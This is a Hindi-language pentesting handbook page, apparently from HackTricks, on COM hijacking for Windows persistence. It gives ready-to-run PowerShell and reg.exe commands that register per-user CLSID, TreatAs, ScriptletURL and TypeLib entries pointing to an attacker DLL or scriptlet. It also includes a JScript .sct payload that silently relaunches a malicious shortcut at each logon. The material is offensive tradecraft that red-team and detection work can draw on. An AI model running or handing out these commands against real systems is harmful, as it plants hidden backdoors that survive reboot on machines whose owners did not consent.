# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### अस्तित्वहीन COM घटकों की खोज

चूंकि उपयोगकर्ता HKCU के मानों को संशोधित कर सकते हैं, इसलिए **COM Hijacking** का उपयोग एक **persistence mechanism** के रूप में किया जा सकता है। `procmon` का उपयोग करके उन COM रजिस्ट्रियों को ढूँढना आसान है जिनका अभी तक अस्तित्व नहीं है और जिन्हें एक हमलावर बना सकता है। क्लासिक फ़िल्टर:

- **RegOpenKey** ऑपरेशन।
- जहाँ _Result_ **NAME NOT FOUND** हो।
- और _Path_ **InprocServer32** पर समाप्त होता हो।

खोज के दौरान उपयोगी विविधताएँ:

- लापता **`LocalServer32`** keys भी देखें। कुछ COM क्लासेज out-of-process servers होते हैं और DLL की बजाय हमलावर-नियंत्रित EXE लॉन्च करेंगे।
- `InprocServer32` के अलावा **`TreatAs`** और **`ScriptletURL`** रजिस्ट्री ऑपरेशन्स के लिए खोजें। हाल की detection content और malware writeups इन्हें बार-बार उल्लेख करते हैं क्योंकि ये सामान्य COM registrations की तुलना में बहुत कम होते हैं और इसलिए high-signal होते हैं।
- जब किसी registration को HKCU में क्लोन कर रहे हों, तो मूल `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` से वैध **`ThreadingModel`** कॉपी करें। गलत मॉडल का उपयोग अक्सर activation को तोड़ देता है और hijack को noisy बना देता है।
- 64-bit सिस्टम पर 64-bit और 32-bit दोनों व्यूज़ जांचें (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` और `HKLM\Software\Classes\WOW6432Node`) क्योंकि 32-bit applications अलग COM registration को resolve कर सकते हैं।

एक बार जब आप तय कर लें कि किस अस्तित्वहीन COM को impersonate करना है, तो निम्नलिखित commands चलाएँ। _सावधान रहें: यदि आप ऐसा COM impersonate करते हैं जो हर कुछ सेकंड में लोड होता है तो यह overkill हो सकता है._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### हाइजैक करने योग्य Task Scheduler COM components

Windows Tasks Custom Triggers का उपयोग COM objects को कॉल करने के लिए करते हैं और चूँकि इन्हें Task Scheduler के माध्यम से निष्पादित किया जाता है, इसलिए यह अनुमान लगाना आसान होता है कि इन्हें कब ट्रिगर किया जाएगा।

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

आउटपुट की जाँच करके आप कोई ऐसा टास्क चुन सकते हैं जो उदाहरण के लिए हर बार जब कोई उपयोगकर्ता लॉग इन करता है तब निष्पादित होगा।

अब CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** को **HKEY\CLASSES\ROOT\CLSID** और HKLM तथा HKCU में खोजने पर, आमतौर पर आप पाएंगे कि वह वैल्यू HKCU में मौजूद नहीं होती।
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
फिर, आप बस HKCU एंट्री बना सकते हैं और हर बार जब उपयोगकर्ता लॉग इन करेगा, आपका backdoor सक्रिय हो जाएगा।

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` एक CLSID को दूसरे द्वारा अनुकरण (emulate) किए जाने की अनुमति देता है। आक्रामक दृष्टिकोण से इसका मतलब है कि आप मूल CLSID को अप्रभावित छोड़ सकते हैं, एक दूसरा प्रति-उपयोगकर्ता (per-user) CLSID बना सकते हैं जो `scrobj.dll` की ओर इशारा करता है, और फिर वास्तविक COM object को `HKCU\Software\Classes\CLSID\{Victim}\TreatAs` के साथ खतरनाक वाले की ओर रीडायरेक्ट कर सकते हैं।

This is useful when:

- लक्षित एप्लिकेशन पहले से ही लॉगऑन या ऐप स्टार्ट पर एक स्थिर CLSID instantiate करती है
- आप original `InprocServer32` को बदलने के बजाय केवल registry-आधारित redirect चाहते हैं
- आप local या remote `.sct` scriptlet को `ScriptletURL` value के माध्यम से execute करना चाहते हैं

उदाहरण वर्कफ़्लो (सार्वजनिक Atomic Red Team tradecraft और पुराने COM registry abuse research से अनुकूलित):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Notes:

- `scrobj.dll` `ScriptletURL` मान पढ़ता है और संदर्भित `.sct` को निष्पादित करता है, इसलिए आप payload को लोकल फ़ाइल के रूप में रख सकते हैं या HTTP/HTTPS पर रिमोट से खींच सकते हैं।
- `TreatAs` तब विशेष रूप से उपयोगी होता है जब मूल COM रजिस्ट्रेशन HKLM में पूरा और स्थिर होता है, क्योंकि आपको पूरे ट्री को मिरर करने की बजाय केवल एक छोटा per-user redirect करना पड़ता है।
- प्राकृतिक trigger का इंतज़ार किए बिना validation के लिए, आप फेक ProgID/CLSID को मैन्युअली instantiate कर सकते हैं: `rundll32.exe -sta <ProgID-or-CLSID>` अगर लक्ष्य क्लास STA activation का समर्थन करता है।

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) COM इंटरफेस को परिभाषित करते हैं और `LoadTypeLib()` के माध्यम से लोड होते हैं। जब कोई COM server instantiate होता है, तो OS संबंधित TypeLib को भी लोड कर सकता है और इसके लिए रजिस्ट्री कुंजियों `HKCR\TypeLib\{LIBID}` की जाँच करता है। अगर TypeLib path को किसी **moniker** से बदल दिया जाए, उदाहरण के लिए `script:C:\...\evil.sct`, तो जब TypeLib resolve होगा Windows scriptlet को execute करेगा — जिससे एक stealthy persistence बनता है जो सामान्य components के उपयोग पर trigger होता है।

यह Microsoft Web Browser control के खिलाफ देखा गया है (जो अक्सर Internet Explorer, WebBrowser एम्बेड करने वाले apps, और यहाँ तक कि `explorer.exe` द्वारा लोड होता है)।

### Steps (PowerShell)

1) उस TypeLib (LIBID) की पहचान करें जिसे किसी अधिक-प्रचलित CLSID द्वारा उपयोग किया जाता है। उदाहरण के लिए CLSID जो अक्सर malware chains द्वारा दुरुपयोग किया जाता है: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) प्रति-उपयोगकर्ता TypeLib पथ को स्थानीय scriptlet की ओर `script:` मोनाइकर का उपयोग करके निर्देशित करें (किसी admin अधिकार की आवश्यकता नहीं):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) एक न्यूनतम JScript `.sct` रखें जो आपके primary payload को पुनः लॉन्च करे (उदा. प्रारंभिक चेन द्वारा उपयोग किया गया `.lnk`):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Triggering – IE खोलने, ऐसे एप्लिकेशन से जो WebBrowser control को एम्बेड करता है, या सामान्य Explorer गतिविधि से भी TypeLib लोड होगा और scriptlet निष्पादित होगा, re-arming your chain on logon/reboot।

सफाई
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
नोट्स
- आप वही तर्क अन्य अधिक-प्रचलित COM components पर भी लागू कर सकते हैं; हमेशा पहले वास्तविक `LIBID` को `HKCR\CLSID\{CLSID}\TypeLib` से पता करें।
- 64-bit सिस्टमों पर आप 64-bit उपभोक्ताओं के लिए `win64` subkey भी भर सकते हैं।

## संदर्भ

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Revisiting COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [CLSID Key (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
